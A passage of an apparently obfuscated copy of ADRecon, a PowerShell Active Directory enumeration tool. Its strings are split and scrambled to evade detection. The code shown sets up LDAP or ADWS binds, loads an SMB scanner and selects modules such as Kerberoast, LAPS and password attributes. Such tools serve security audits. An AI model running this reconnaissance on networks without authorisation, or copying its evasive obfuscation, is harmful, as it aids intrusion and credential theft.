        'XML'
        {
            $XMLPath  = -join($ADROutputDir,'\',("{2}{1}{0}" -f 'es','-Fil','XML'))
            If (!(Test-Path -Path $XMLPath\*))
            {
                Write-Verbose ('Rem'+'ove'+'d '+'Em'+'pty '+'Dire'+'ctor'+'y '+"$XMLPath")
                Remove-Item $XMLPath
            }
        }
        ("{0}{1}"-f 'JSO','N')
        {
            $JSONPath  = -join($ADROutputDir,'\',("{2}{1}{3}{0}"-f's','SO','J','N-File'))
            If (!(Test-Path -Path $JSONPath\*))
            {
                Write-Verbose ('R'+'emov'+'ed '+'Empty'+' '+'D'+'irecto'+'ry '+"$JSONPath")
                Remove-Item $JSONPath
            }
        }
        ("{0}{1}" -f'H','TML')
        {
            $HTMLPath  = -join($ADROutputDir,'\',("{2}{0}{1}" -f'TML-File','s','H'))
            If (!(Test-Path -Path $HTMLPath\*))
            {
                Write-Verbose ('Re'+'moved '+'Em'+'pty '+'Dir'+'ecto'+'ry'+' '+"$HTMLPath")
                Remove-Item $HTMLPath
            }
        }
    }
    If (!(Test-Path -Path $ADROutputDir\*))
    {
        Remove-Item $ADROutputDir
        Write-Verbose ('Removed'+' '+'Empt'+'y '+'D'+'irecto'+'ry '+"$ADROutputDir")
    }
}

Function Get-ADRAbout
{

    param(
        [Parameter(ManDAtoRy = $true)]
        [string] $Method,

        [Parameter(mAnDatoRY = $true)]
        [DateTime] $date,

        [Parameter(mAnDaTORY = $true)]
        [string] $ADReconVersion,

        [Parameter(MaNDatOry = $false)]
        [Management.Automation.PSCredential] $Credential =   ( get-CHilDITem VarIABLe:q3cUvM  ).VAlUe::"Emp`Ty",

        [Parameter(MaNdaTory = $true)]
        [string] $RanonComputer,

        [Parameter(maNDaTorY = $true)]
        [string] $TotalTime
    )

    $AboutADRecon = @()

    $Version = $Method + ("{0}{1}{2}" -f ' Ve','r','sion')

    If ($Credential -ne  (  VaRiABlE ('q'+'3cUvm')  ).vAlUe::"eM`Pty")
    {
        $Username = $($Credential."Usern`AMe")
    }
    Else
    {
        $Username = $( (  ChILdItEm ('VaRI'+'A'+'bLe'+':YeD'+'f')  ).vALue::"uS`ER`NaME")
    }

    $ObjValues = @(("{1}{0}"-f'ate','D'), $($date), ("{1}{0}"-f 'DRecon','A'), ("{3}{6}{5}{0}{2}{1}{4}" -f'/a','/A','drecon','https:','DRecon','com','//github.'), $Version, $($ADReconVersion), ("{1}{2}{0}{3}"-f'us','R','an as ','er'), $Username, ("{2}{0}{3}{1}" -f 'an on','computer','R',' '), $RanonComputer, ("{3}{2}{1}{0}" -f 'ion Time (mins)','ut','xec','E'), $($TotalTime))

    For ($i = 0; $i -lt $($ObjValues."Co`UnT"); $i++)
    {
        $Obj = New-Object PSObject
        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Ca','tegory') -Value $ObjValues[$i]
        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'Valu','e') -Value $ObjValues[$i+1]
        $i++
        $AboutADRecon += $Obj
    }
    Return $AboutADRecon
}

Function Invoke-ADRecon
{

    param(
        [Parameter(MANDaTOrY = $false)]
        [string] $GenExcel,

        [Parameter(ManDaToRy = $false)]
        [ValidateSet({"{0}{1}"-f 'ADW','S'}, {"{0}{1}" -f 'LD','AP'})]
        [string] $Method = ("{0}{1}"-f'ADW','S'),

        [Parameter(MandATOrY = $true)]
        [array] $Collect,

        [Parameter(maNDAtOry = $false)]
        [string] $DomainController = '',

        [Parameter(MAnDATORy = $false)]
        [Management.Automation.PSCredential] $Credential =  ( GeT-iTEm VarIAbLe:q3CuvM  ).VALUe::"em`Pty",

        [Parameter(mAnDAtorY = $true)]
        [array] $OutputType,

        [Parameter(MaNdaTOrY = $false)]
        [string] $ADROutputDir,

        [Parameter(MANDAtOry = $false)]
        [int] $DormantTimeSpan = 90,

        [Parameter(MaNDATORY = $false)]
        [int] $PassMaxAge = 30,

        [Parameter(MANdATOry = $false)]
        [int] $PageSize = 200,

        [Parameter(maNDAtORy = $false)]
        [int] $Threads = 10,

        [Parameter(MAndaTOrY = $false)]
        [bool] $UseAltCreds = $false
    )

    [string] $ADReconVersion = ("{1}{0}"-f'.24','v1')
    Write-Output ('[*'+'] '+'AD'+'R'+'econ '+"$ADReconVersion "+'by'+' '+'Pra'+'shant'+' '+'Mah'+'aj'+'an '+'(@p'+'ras'+'ha'+'nt3535)')

    If ($GenExcel)
    {
        If (!(Test-Path $GenExcel))
        {
            Write-Output ("{1}{6}{9}{2}{11}{8}{5}{10}{3}{7}{0}{4}" -f 'i','[I','i',' ..','ng','a','nvoke-ADRecon','. Exit',' P','] Inval','th','d')
            Return $null
        }
        Export-ADRExcel -ExcelPath $GenExcel
        Return $null
    }

    
    $SaveVerbosePreference = $script:VerbosePreference
    $script:VerbosePreference = ("{2}{0}{1}{3}" -f 'y','Conti','Silentl','nue')
    Try
    {
        If ($PSVersionTable."p`Sve`RSIoN"."m`AJOr" -ne 2)
        {
            $computer = Get-CimInstance -ClassName Win32_ComputerSystem
            $computerdomainrole = ($computer)."domA`i`NrO`Le"
        }
        Else
        {
            $computer = Get-WMIObject win32_computersystem
            $computerdomainrole = ($computer)."dOMaIN`R`OLE"
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
    }
    If ($SaveVerbosePreference)
    {
        $script:VerbosePreference = $SaveVerbosePreference
        Remove-Variable SaveVerbosePreference
    }

    switch ($computerdomainrole)
    {
        0
        {
            [string] $computerrole = ("{0}{3}{4}{2}{1}"-f 'Standalo','ion','kstat','n','e Wor')
            $Env:ADPS_LoadDefaultDrive = 0
            $UseAltCreds = $true
        }
        1 { [string] $computerrole = ("{3}{0}{1}{4}{2}"-f 'r Workst','at','n','Membe','io') }
        2
        {
            [string] $computerrole = ("{2}{1}{0}{4}{3}" -f ' ','andalone','St','r','Serve')
            $UseAltCreds = $true
            $Env:ADPS_LoadDefaultDrive = 0
        }
        3 { [string] $computerrole = ("{1}{2}{0}"-f 'ver','Mem','ber Ser') }
        4 { [string] $computerrole = ("{0}{4}{3}{1}{5}{6}{2}" -f 'Backup Doma','tr','ler',' Con','in','o','l') }
        5 { [string] $computerrole = ("{5}{3}{0}{4}{2}{1}{6}" -f'oma','Con','n ','ry D','i','Prima','troller') }
        default { Write-Output ("{4}{6}{5}{9}{8}{1}{3}{0}{7}{2}{10}" -f' iden',' not','ified',' be','C','uter ','omp','t','d','Role coul','.') }
    }

    $RanonComputer = "$($computer.domain)\$([Environment]::MachineName) - $($computerrole) "
    Remove-Variable computer
    Remove-Variable computerdomainrole
    Remove-Variable computerrole

    
    If (($DomainController -ne "") -or ($Credential -ne  (  Get-vaRIablE ("Q3C"+"uVM")).valuE::"E`MpTy"))
    {
        
        If (($Method -eq ("{0}{1}" -f'A','DWS')) -and (-Not $UseAltCreds))
        {
            $Env:ADPS_LoadDefaultDrive = 0
        }
        $UseAltCreds = $true
    }

    
    If ($Method -eq ("{1}{0}"-f 'DWS','A'))
    {
        If (Get-Module -ListAvailable -Name ActiveDirectory)
        {
            Try
            {
                
                $SaveVerbosePreference = $script:VerbosePreference;
                $script:VerbosePreference = ("{4}{5}{3}{1}{0}{2}"-f'ntinu','yCo','e','ntl','Sil','e');
                Import-Module ActiveDirectory -WarningAction Stop -ErrorAction Stop | Out-Null
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
            }
            Catch
            {
                Write-Warning ("{12}{19}{23}{1}{25}{22}{8}{10}{11}{0}{7}{16}{14}{27}{5}{18}{28}{24}{30}{3}{13}{21}{20}{6}{15}{26}{17}{4}{9}{29}{2}"-f'ire','econ]','LDAP','e S','g','R','ation','ctor','port',' wit','ing Ac','tiveD','[Invok','er','odule fr',' To','y M','ontinuin','SA','e-A','er Administr','v',' im','DR',' (Rem',' Error','ols) ... C','om ','T','h ','ot')
                $Method = ("{0}{1}" -f'LDA','P')
                If ($SaveVerbosePreference)
                {
                    $script:VerbosePreference = $SaveVerbosePreference
                    Remove-Variable SaveVerbosePreference
                }
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }
        Else
        {
            Write-Warning (("{22}{8}{5}{15}{13}{11}{19}{7}{4}{14}{2}{16}{18}{6}{20}{21}{17}{10}{0}{1}{3}{23}{9}{12}"-f 'ls) is no','t installed ...','om R',' Co',' Modu','ke-ADRecon]','Adminis','ry','nvo','ui','Too','veD','ng with LDAP','Acti','le fr',' ','SAT (R','tion ','emote Server ','irecto','t','ra','[I','ntin'))
            $Method = ("{0}{1}"-f'L','DAP')
        }
    }

    
    
    $SaveDebugPreference = $script:DebugPreference
    $script:DebugPreference = ("{1}{2}{0}" -f'e','SilentlyContin','u')
    Try
    {
        $Advapi32 = Add-Type -MemberDefinition $Advapi32Def -Name ("{0}{2}{1}"-f'Ad','api32','v') -Namespace ADRecon -PassThru
        $Kernel32 = Add-Type -MemberDefinition $Kernel32Def -Name ("{0}{1}{2}" -f'Ke','rne','l32') -Namespace ADRecon -PassThru
        
        $CLR = ( ( VarIAble  ("lep"+"X")  -vALuE  )::("{2}{4}{1}{0}{3}" -f'embl','ss','GetExecut','y','ingA').Invoke()."imAGERU`N`T`IM`EveRSion")[1]
        If ($Method -eq ("{0}{1}" -f'ADW','S'))
        {
            
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ( ( geT-VariablE LEpx ).VAluE::("{2}{0}{1}{3}" -f'd','Wit','Loa','hPartialName').Invoke(("{7}{6}{5}{9}{3}{10}{4}{0}{8}{2}{1}" -f 'y.Ma','ent','gem','eDi','ector','oft.Ac','icros','M','na','tiv','r')))."L`oc`ATion"
                    ( (iTem varIablE:LepX).vaLuE::("{6}{1}{5}{2}{3}{4}{0}" -f 'lName','o','Wi','thP','artia','ad','L').Invoke(("{4}{5}{3}{0}{2}{6}{1}"-f'c','ices','tory','Dire','S','ystem.','Serv')))."lOCaT`ioN"
                    (  ( gEt-VaRIaBle  LEpx).ValUe::("{2}{0}{5}{4}{1}{3}" -f 'oadW','l','L','Name','ia','ithPart').Invoke(("{1}{2}{0}" -f'XML','Sy','stem.')))."l`oCaT`IoN"
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($ADWSSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    ( (Ls  VAriaBlE:lePx ).vaLUe::("{5}{3}{4}{1}{2}{0}" -f 'e','lNa','m','dWithParti','a','Loa').Invoke(("{3}{4}{0}{2}{1}{5}" -f 'e','y.Ma','Director','Micro','soft.Activ','nagement')))."lO`cat`ion"
                    (  ( get-varIABLE  lEpx ).ValUE::("{1}{2}{4}{3}{0}" -f'lName','Lo','adWi','tia','thPar').Invoke(("{0}{5}{7}{4}{6}{3}{1}{2}" -f 'S','toryService','s','c','.','yst','Dire','em')))."L`O`CaTion"
                    ( $lePX::("{2}{1}{0}{3}"-f 'ithP','oadW','L','artialName').Invoke(("{0}{1}{2}" -f'Syste','m.','XML')))."l`o`CatIon"
                )) -Language CSharpVersion3
            }
        }

        If ($Method -eq ("{1}{0}"-f 'DAP','L'))
        {
            If ($CLR -eq "4")
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    (  (  dIR  vaRIable:LepX ).ValUe::("{1}{4}{3}{2}{0}{5}"-f 'Partia','L','h','t','oadWi','lName').Invoke(("{4}{1}{2}{0}{5}{6}{3}" -f 'r','m','.DirectorySe','es','Syste','vi','c')))."LOC`A`TiON"
                    ( ( GcI  ("V"+"aRIAbLe:le"+"PX")).valuE::("{3}{2}{1}{4}{0}" -f 'ame','ia','oadWithPart','L','lN').Invoke(("{3}{2}{0}{1}" -f'.XM','L','ystem','S')))."loC`ATI`ON"
                ))
            }
            Else
            {
                Add-Type -TypeDefinition $($LDAPSource+$PingCastleSMBScannerSource) -ReferencedAssemblies ([System.String[]]@(
                    (  ( vaRIABLE lePx  -Val  )::("{0}{2}{3}{1}"-f 'Loa','ame','dWithPar','tialN').Invoke(("{0}{1}{3}{4}{2}"-f'S','y','ctoryServices','stem.D','ire')))."L`OcAtioN"
                    ( ( vARiaBLE ("l"+"EpX") ).VALuE::("{2}{3}{1}{0}"-f 'e','m','LoadWithPartialN','a').Invoke(("{1}{2}{0}" -f 'em.XML','Sys','t')))."lO`C`ATiOn"
                )) -Language CSharpVersion3
            }
        }
    }
    Catch
    {
        Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
        Return $null
    }
    If ($SaveDebugPreference)
    {
        $script:DebugPreference = $SaveDebugPreference
        Remove-Variable SaveDebugPreference
    }

    
    
    If (($Method -eq ("{0}{1}" -f'L','DAP')) -and ($UseAltCreds) -and ($DomainController -eq "") -and ($Credential -eq   (  GEt-varIaBLE  Q3CUvm -vA  )::"e`mPtY"))
    {
        Try
        {
            $objDomain = [ADSI]""
            If(!($objDomain."NA`mE"))
            {
                Write-Verbose ("{9}{2}{10}{6}{1}{12}{7}{0}{8}{5}{11}{4}{3}" -f 'bi','Recon] RUNAS Check, L','Inv','ful','ss','succ','-AD',' ','nd Un','[','oke','e','DAP')
            }
            $UseAltCreds = $false
            $objDomain.("{1}{0}{2}"-f 's','Dispo','e').Invoke()
        }
        Catch
        {
            $UseAltCreds = $true
        }
    }

    If ($UseAltCreds -and (($DomainController -eq "") -or ($Credential -eq  (Get-VariAble ("Q3cu"+"vm")  -VaLUeo )::"EmP`Ty")))
    {

        If (($DomainController -ne "") -and ($Credential -eq  $q3cUVM::"e`mPTy"))
        {
            Try
            {
                $Credential = Get-Credential
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                Return $null
            }
        }
        Else
        {
            Write-Output ((("{0}{14}{10}{13}{7}{3}{9}{1}{11}{6}{2}{8}{12}{4}{5}" -f 'Ru','ps1 -Exam','dit','A','orma','tion.','es for ad','8','io','DRecon.','lp .','pl','nal inf','Ou','n Get-He')).("{0}{2}{1}" -f're','E','plAC').Invoke('Ou8','\'))
            Write-Output ("{0}{4}{10}{8}{11}{2}{1}{13}{9}{6}{3}{5}{7}{12}" -f'[Invoke-ADRec','om','-D','ller and -Credenti','on]','al par','ro','ameter','Us','inCont',' ','e the ','.','a')`n
            Return $null
        }
    }

    Write-Output ('[*'+'] '+'Ru'+'nning'+' '+'on'+' '+"$RanonComputer")

    Switch ($Collect)
    {
        ("{1}{2}{0}" -f 'st','For','e') { $ADRForest = $true }
        ("{1}{0}"-f'ain','Dom') {$ADRDomain = $true }
        ("{2}{1}{0}"-f 'ts','us','Tr') { $ADRTrust = $true }
        ("{1}{0}" -f'tes','Si') { $ADRSite = $true }
        ("{0}{1}"-f 'Subn','ets') { $ADRSubnet = $true }
        ("{2}{0}{4}{1}{3}" -f 'e','aHis','Sch','tory','m') { $ADRSchemaHistory = $true }
        ("{1}{3}{0}{2}"-f'lic','Passw','y','ordPo') { $ADRPasswordPolicy = $true }
        ("{0}{4}{3}{6}{2}{1}{5}"-f 'FineGrain','i','ordPol','as','edP','cy','sw') { $ADRFineGrainedPasswordPolicy = $true }
        ("{2}{0}{1}{3}"-f'i','nContr','Doma','ollers') { $ADRDomainControllers = $true }
        ("{0}{1}" -f'U','sers') { $ADRUsers = $true }
        ("{1}{2}{0}" -f's','Us','erSPN') { $ADRUserSPNs = $true }
        ("{0}{4}{5}{2}{3}{1}"-f 'Pas','tes','ttrib','u','sw','ordA') { $ADRPasswordAttributes = $true }
        ("{1}{0}" -f'ps','Grou') {$ADRGroups = $true }
        ("{2}{1}{0}" -f 'es','pChang','Grou') { $ADRGroupChanges = $true }
        ("{2}{1}{0}{3}"-f 'mber','pMe','Grou','s') { $ADRGroupMembers = $true }
        'OUs' { $ADROUs = $true }
        ("{0}{1}" -f 'G','POs') { $ADRGPOs = $true }
        ("{2}{0}{1}"-f'P','Links','g') { $ADRgPLinks = $true }
        ("{0}{1}{2}" -f'D','NSZone','s') { $ADRDNSZones = $true }
        ("{1}{0}{2}"-f 'c','DNSRe','ords') { $ADRDNSRecords = $true }
        ("{0}{1}" -f'Printer','s') { $ADRPrinters = $true }
        ("{1}{0}"-f 'puters','Com') { $ADRComputers = $true }
        ("{0}{3}{1}{2}"-f 'C','mput','erSPNs','o') { $ADRComputerSPNs = $true }
        ("{1}{0}" -f 'S','LAP') { $ADRLAPS = $true }
        ("{2}{0}{1}" -f'k','er','BitLoc') { $ADRBitLocker = $true }
        ("{0}{1}" -f'AC','Ls') { $ADRACLs = $true }
        ("{2}{1}{0}"-f'ort','ORep','GP')
        {
            $ADRGPOReport = $true
            $ADRCreate = $true
        }
        ("{1}{2}{0}"-f't','Kerbero','as') { $ADRKerberoast = $true }
        ("{0}{1}{5}{3}{4}{7}{2}{6}{9}{8}"-f 'D','om','sedf','nAcco','u','ai','orServ','ntsu','ceLogon','i') { $ADRDomainAccountsusedforServiceLogon = $true }
        ("{0}{1}"-f 'Def','ault')
        {
            $ADRForest = $true
            $ADRDomain = $true
            $ADRTrust = $true
            $ADRSite = $true
            $ADRSubnet = $true
            $ADRSchemaHistory = $true
            $ADRPasswordPolicy = $true
            $ADRFineGrainedPasswordPolicy = $true
            $ADRDomainControllers = $true
            $ADRUsers = $true
            $ADRUserSPNs = $true
            $ADRPasswordAttributes = $true
            $ADRGroups = $true
            $ADRGroupMembers = $true
            $ADRGroupChanges = $true
            $ADROUs = $true
            $ADRGPOs = $true
            $ADRgPLinks = $true
            $ADRDNSZones = $true
            $ADRDNSRecords = $true
            $ADRPrinters = $true
            $ADRComputers = $true
            $ADRComputerSPNs = $true
            $ADRLAPS = $true
            $ADRBitLocker = $true
            
            $ADRGPOReport = $true
            
            

            If ($OutputType -eq ("{0}{2}{1}"-f'D','fault','e'))
            {
                [array] $OutputType = "CSV",("{1}{0}"-f 'cel','Ex')
            }
        }
    }

    Switch ($OutputType)
    {
        ("{2}{0}{1}" -f'TD','OUT','S') { $ADRSTDOUT = $true }
        'CSV'
        {
            $ADRCSV = $true
            $ADRCreate = $true
        }
        'XML'
        {
            $ADRXML = $true
            $ADRCreate = $true
        }
        ("{1}{0}" -f'N','JSO')
        {
            $ADRJSON = $true
            $ADRCreate = $true
        }
        ("{0}{1}" -f 'HT','ML')
        {
            $ADRHTML = $true
            $ADRCreate = $true
        }
        ("{1}{0}"-f 'l','Exce')
        {
            $ADRExcel = $true
            $ADRCreate = $true
        }
        'All'
        {
            
            $ADRCSV = $true
            $ADRXML = $true
            $ADRJSON = $true
            $ADRHTML = $true
            $ADRExcel = $true
            $ADRCreate = $true
            [array] $OutputType = "CSV","XML",("{0}{1}" -f 'JS','ON'),("{1}{0}"-f 'TML','H'),("{1}{0}"-f 'l','Exce')
        }
        ("{0}{1}{2}" -f 'Defa','ul','t')
        {
            [array] $OutputType = {"{1}{0}{2}"-f 'U','STDO','T'}
            $ADRSTDOUT = $true
        }
    }

    If ( ($ADRExcel) -and (-Not $ADRCSV) )
    {
        $ADRCSV = $true
        [array] $OutputType += "CSV"
    }

    $returndir = Get-Location
    $date = Get-Date

    
    If ( ($ADROutputDir) -and ($ADRCreate) )
    {
        If (!(Test-Path $ADROutputDir))
        {
            New-Item $ADROutputDir -type directory | Out-Null
            If (!(Test-Path $ADROutputDir))
            {
                Write-Output ("{1}{9}{2}{3}{7}{6}{4}{8}{0}{11}{13}{12}{10}{5}"-f 't','[In','ke-','ADReco','alid','g','] Error, inv','n',' Ou','vo','in','p','Dir Path ... Exit','ut')
                Return $null
            }
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).("{2}{0}{1}" -f'imEn','d','Tr').Invoke("\"))
        Write-Verbose ('[*]'+' '+'O'+'utput '+'Direct'+'ory'+': '+"$ADROutputDir")
    }
    ElseIf ($ADRCreate)
    {
        $ADROutputDir =  -join($returndir,'\',("{0}{2}{1}" -f'ADRecon-','eport-','R'),$(Get-Date -UFormat %Y%m%d%H%M%S))
        New-Item $ADROutputDir -type directory | Out-Null
        If (!(Test-Path $ADROutputDir))
        {
            Write-Output ("{5}{13}{6}{7}{16}{12}{9}{10}{0}{14}{2}{1}{8}{4}{11}{3}{15}"-f'at','t','outpu','to','r','[Invoke-','Re','co',' di','r, could',' not cre','ec','Erro','AD','e ','ry','n] ')
            Return $null
        }
        $ADROutputDir = $((Convert-Path $ADROutputDir).("{0}{2}{1}" -f 'Tr','d','imEn').Invoke("\"))
        Remove-Variable ADRCreate
    }
    Else
    {
        $ADROutputDir = $returndir
    }

    If ($ADRCSV)
    {
        $CSVPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{1}{0}{3}{2}"-f 'SV','C','s','-File'))
        New-Item $CSVPath -type directory | Out-Null
        If (!(Test-Path $CSVPath))
        {
            Write-Output ("{15}{7}{11}{5}{1}{2}{14}{9}{6}{3}{13}{0}{8}{10}{4}{12}"-f'n','A','DRecon] ','u','ire','-','r, co','vok','ot create out','o','put d','e','ctory','ld ','Err','[In')
            Return $null
        }
        Remove-Variable ADRCSV
    }

    If ($ADRXML)
    {
        $XMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{0}{1}{2}"-f 'X','M','L-Files'))
        New-Item $XMLPath -type directory | Out-Null
        If (!(Test-Path $XMLPath))
        {
            Write-Output ("{8}{11}{13}{2}{1}{0}{9}{10}{14}{5}{3}{4}{6}{12}{7}" -f 'n','co','e','n','o','d ','t create o','ctory','[I','] Err','o','nvoke','utput dire','-ADR','r, coul')
            Return $null
        }
        Remove-Variable ADRXML
    }

    If ($ADRJSON)
    {
        $JSONPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{2}{1}{0}"-f '-Files','ON','JS'))
        New-Item $JSONPath -type directory | Out-Null
        If (!(Test-Path $JSONPath))
        {
            Write-Output ("{3}{12}{11}{6}{9}{14}{1}{8}{0}{2}{7}{4}{15}{5}{10}{13}" -f'ld ',' ','n','[I','re','ir','e-','ot c','cou','ADRecon]','ec','vok','n','tory',' Error,','ate output d')
            Return $null
        }
        Remove-Variable ADRJSON
    }

    If ($ADRHTML)
    {
        $HTMLPath = [System.IO.DirectoryInfo] -join($ADROutputDir,'\',("{0}{1}{2}" -f 'HT','ML-File','s'))
        New-Item $HTMLPath -type directory | Out-Null
        If (!(Test-Path $HTMLPath))
        {
            Write-Output ("{9}{3}{4}{7}{10}{1}{0}{6}{5}{8}{2}"-f'eate','ror, could not cr','ory','voke-ADR','eco','tput d',' ou','n','irect','[In','] Er')
            Return $null
        }
        Remove-Variable ADRHTML
    }

    
    If ($UseAltCreds -and ($Method -eq ("{1}{0}"-f'DWS','A')))
    {
        If (!(Test-Path ADR:))
        {
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Else
        {
            Remove-PSDrive ADR
            Try
            {
                New-PSDrive -PSProvider ActiveDirectory -Name ADR -Root "" -Server $DomainController -Credential $Credential -ErrorAction Stop | Out-Null
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Set-Location ADR:
        Write-Debug ("{4}{2}{1}{0}{5}{3}{6}"-f'Dri','S','DR P','e C','A','v','reated')
    }

    If ($Method -eq ("{1}{0}"-f'DAP','L'))
    {
        If ($UseAltCreds)
        {
            Try
            {
                $objDomain = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)", $Credential."uSERna`Me",$Credential.("{1}{4}{2}{0}{5}{6}{3}"-f'k','GetNe','r','tial','two','Cred','en').Invoke()."pa`Ss`WOrd"
                $objDomainRootDSE = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/RootDSE", $Credential."USE`RN`Ame",$Credential.("{3}{1}{2}{0}"-f 'l','etNetworkCreden','tia','G').Invoke()."p`ASs`WorD"
            }
            Catch
            {
                Write-Output "[Invoke-ADRecon] $($_.Exception.Message) "
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            If(!($objDomain."nA`ME"))
            {
                Write-Output ("{7}{6}{2}{9}{5}{1}{10}{0}{4}{8}{3}" -f'AP bi',' ','Re','ul','nd Unsucc','on]','voke-AD','[In','essf','c','LD')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
            Else
            {
                Write-Output ("{3}{2}{0}{5}{1}{4}"-f 'bind Su','fu','DAP ','[*] L','l','ccess')
            }
        }
        Else
        {
            $objDomain = [ADSI]""
            $objDomainRootDSE = ([ADSI] ("{1}{2}{0}{3}" -f'//RootD','L','DAP:','SE'))
            If(!($objDomain."N`AmE"))
            {
                Write-Output ("{5}{3}{2}{6}{4}{0}{1}{7}" -f'ssf','u','ec','oke-ADR',' LDAP bind Unsucce','[Inv','on]','l')
                If ($ADROutputDir)
                {
                    Remove-EmptyADROutputDir $ADROutputDir $OutputType
                }
                Return $null
            }
        }
        Write-Debug ("{4}{2}{0}{1}{3}"-f 'S','ucc','ing ','essful','LDAP B')
    }

    Write-Output ('[*'+'] '+'C'+'ommenc'+'ing '+'- '+"$date")
    If ($ADRDomain)
    {
        Write-Output ("{2}{0}{1}"-f' Domai','n','[-]')
        $ADRObject = Get-ADRDomain -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{2}{1}"-f 'D','ain','om')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRDomain
    }
    If ($ADRForest)
    {
        Write-Output ("{1}{0}{2}" -f 'o','[-] F','rest')
        $ADRObject = Get-ADRForest -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}{2}" -f'Fo','r','est')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRForest
    }
    If ($ADRTrust)
    {
        Write-Output ("{2}{1}{0}" -f 's',' Trust','[-]')
        $ADRObject = Get-ADRTrust -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{0}{1}"-f'Tru','sts')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRTrust
    }
    If ($ADRSite)
    {
        Write-Output ("{1}{3}{0}{2}" -f'Sit','[-','es','] ')
        $ADRObject = Get-ADRSite -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}"-f 's','Site')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSite
    }
    If ($ADRSubnet)
    {
        Write-Output ("{0}{1}{3}{2}" -f '[','-] ','nets','Sub')
        $ADRObject = Get-ADRSubnet -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{0}"-f'ets','Subn')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSubnet
    }
    If ($ADRSchemaHistory)
    {
        Write-Output ("{6}{0}{2}{5}{1}{3}{4}" -f'chemaHisto',' som','ry','e ','time',' - May take','[-] S')
        $ADRObject = Get-ADRSchemaHistory -Method $Method -objDomain $objDomain -objDomainRootDSE $objDomainRootDSE -DomainController $DomainController -Credential $Credential
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{1}{3}{2}{0}"-f 'istory','Sc','maH','he')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRSchemaHistory
    }
    If ($ADRPasswordPolicy)
    {
        Write-Output ("{0}{3}{2}{1}{4}" -f'[-] Def','d Polic','swor','ault Pas','y')
        $ADRObject = Get-ADRDefaultPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{4}{5}{3}{0}{1}{2}"-f'a','sswordPolic','y','P','D','efault')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRPasswordPolicy
    }
    If ($ADRFineGrainedPasswordPolicy)
    {
        Write-Output ("{12}{16}{14}{5}{10}{11}{2}{0}{3}{4}{7}{13}{6}{8}{9}{1}{15}" -f 'sword ','vileged Accoun','d Pas','Pol','i','r',' May ','cy ','need a',' Pri','a','ine','[','-',' G','t','-] Fine')
        $ADRObject = Get-ADRFineGrainedPasswordPolicy -Method $Method -objDomain $objDomain
        If ($ADRObject)
        {
            Export-ADR -ADRObj $ADRObject -ADROutputDir $ADROutputDir -OutputType $OutputType -ADRModuleName ("{4}{3}{7}{0}{2}{1}{6}{5}" -f's','dP','wor','ineGrai','F','y','olic','nedPas')
            Remove-Variable ADRObject
        }
        Remove-Variable ADRFineGrainedPasswordPolicy
    }
